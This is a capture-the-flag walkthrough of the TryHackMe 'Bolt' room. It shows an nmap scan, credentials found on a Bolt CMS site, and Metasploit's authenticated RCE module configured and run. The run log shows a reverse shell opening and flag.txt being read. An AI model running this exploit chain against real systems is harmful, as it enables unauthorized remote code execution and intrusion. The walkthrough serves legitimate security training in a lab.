# Bolt

<a href="https://tryhackme.com/room/bolt">Click here to see the room!</a>

First of all, connect to the VPN and deploy the machine.

The machine IP is ```10.10.189.109``` for me. (It will be different for you)

Run Nmap to search open ports
```
#nmap -sV -sC -A 10.10.189.109
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 03:08 BST
Nmap scan report for 10.10.189.109
Host is up (0.071s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

8000/tcp open  http    (PHP 7.2.32-1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Sun, 23 Aug 2020 01:08:11 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Sun, 23 Aug 2020 01:08:11 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 155466
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sun, 23 Aug 2020 01:08:10 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Sun, 23 Aug 2020 01:08:10 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: d172de
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Bolt | A hero is unleashed

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   72.13 ms 10.8.0.1
2   72.59 ms 10.10.189.109

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.21 seconds
```
3 ports are open.
#1 	What port number has a web server with a CMS running? The answer is there!

Let's check ```10.10.189.109:8000```. Yes it's working! Check the pages. You will find the answer of 
#2 What is the username we can find in the CMS? and 
#3 What is the password we can find for the username?

#4 	What version of the CMS is installed on the server? (Ex: Name 1.1.1)
Just google it how to reach the login page. On the https://docs.bolt.cm/3.7/manual/login you will find ```http://<IP:PORT>/bolt/login```. Enter the username and password that you find on the web page. Now you are on Dashboard page. At the left-bottom corner you can see the answer.

#5 	There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?
Go to https://www.exploit-db.com/ and search for "Bolt cms". You will find the EDB-ID of Authenticated Remote Code Execution vulnerability.

#6 	Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)
Run metasploit! I recommend you to update Metasploit first.

```
#msfconsole

msf6 > search bolt cms
#   Name                                              Disclosure Date  Rank       Check  Description
28  exploit/unix/webapp/bolt_authenticated_rce        2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
```
Can you see the full path for this exploit?

#7 	Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit
You know the username and password. LHOST is your IP that you can find it on https://tryhackme.com/access or ```ifconfig``` on terminal. Keep LPORT 4444. RHOST is the target machine IP. You can see below how to set those parameters. PS: I hide username and password so don't set username as ```b...``` :D
Make sure everything is correct before running ```exploit```/```run```
```
msf6 > use 28
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set lhost 10.8.33.214
lhost => 10.8.33.214
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set rhosts 10.10.189.109
rhosts => 10.10.189.109
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username b...
username => b...
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password b...........
password => b...........
```
#8 	Look for flag.txt inside the machine.

```
msf6 exploit(unix/webapp/bolt_authenticated_rce) > run

[*] Started reverse TCP handler on 10.8.33.214:1234 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "biczvo".
[*] Found 2 potential token(s) for creating .php files.
[+] Used token 886cf3be6cb404b04c371dd3b6 to create jjgvqcgyaxm.php.
[*] Attempting to execute the payload via "/files/jjgvqcgyaxm.php?biczvo=`payload`"
[*] Command shell session 1 opened (10.8.33.214:1234 -> 10.10.189.109:60300) at 2020-08-23 03:41:42 +0100
[!] No response, may have executed a blocking payload!
[+] Deleted file jjgvqcgyaxm.php.
[+] Reverted user profile back to original state.

$ls
index.html
$pwd
/home/bolt/public/files
$cd ..
$ls
bolt-public
extensions
files
index.php
theme
thumbs
$cd ..
$ls
app
composer.json
composer.lock
cron
extensions
index.php
public
README.md
reboot.sh
src
vendor
$cd ..
$ls
bolt
composer-setup.php
flag.txt
cat flag.txt
THM{w.._......_....._...._....7?}
```

Easy machine!

Many thanks to <a href="https://tryhackme.com/p/0x9747">0x9747</a> room creator and <a href="https://tryhackme.com">TryHackMe.com</a> for this free room.

If you think something is wrong, send a mail to hsnckkgl@gmail.com

Best wishes to all the CTF Players,

hsnckkgl
